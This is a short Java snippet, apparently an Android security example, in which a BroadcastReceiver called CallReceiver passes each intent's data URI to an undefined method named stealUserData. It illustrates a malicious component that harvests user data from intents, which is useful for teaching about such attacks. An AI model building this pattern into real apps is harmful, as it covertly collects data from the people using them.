
                  public class CallReceiver extends BroadcastReceiver {@Overridepublic void onReceive(Context context, Intent intent) {Uri userData = intent.getData();stealUserData(userData);}}
               
               